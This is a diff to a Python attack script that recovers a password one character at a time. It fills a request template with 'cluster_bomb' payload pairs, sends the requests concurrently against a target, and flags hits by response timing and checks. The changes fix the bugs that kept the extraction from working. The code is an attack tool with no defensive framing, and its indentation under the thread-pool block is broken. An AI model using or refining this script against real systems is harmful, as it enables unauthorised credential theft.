@@ -35,14 +35,14 @@ def parse_request(request):
     return method, url, headers, body
 
 def decide(template):
-    method, url, headers, body = parse_request(tmp)
+    method, url, headers, body = parse_request(template)
 
     # check delay
     start = time.time()
     if method.upper() == 'GET':
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, allow_redirects=True)
     else:
-        response = requests.post(url, headers=headers, data=body)
+        response = requests.post(url, headers=headers, data=body, allow_redirects=True)
     end = time.time()
 
     response.raise_for_status()
@@ -54,9 +54,7 @@ def send_req(attempt):
     """ tuple representing the current cluster_bomb payload.
     all tests for responses should be implemented inside the decide function."""
 
-    tmp = request_template
-    tmp.replace('CLUSTER0', attempt[0])
-    tmp.replace('CLUSTER1', attempt[1])
+    tmp = request_template.replace('CLUSTER0', str(attempt[0])).replace('CLUSTER1', str(attempt[1]))
 
     if decide(tmp):
       password[(attempt[0] - 1)] = attempt[1]
@@ -87,8 +85,4 @@ if __name__ == "__main__":
     with concurrent.futures.ThreadPoolExecutor(50) as executor:
     executor.map(send_req, payload) 
 
-    output = ""
-    for i in range(20):
-        output += password[i]
-    print(output)
     print(password)
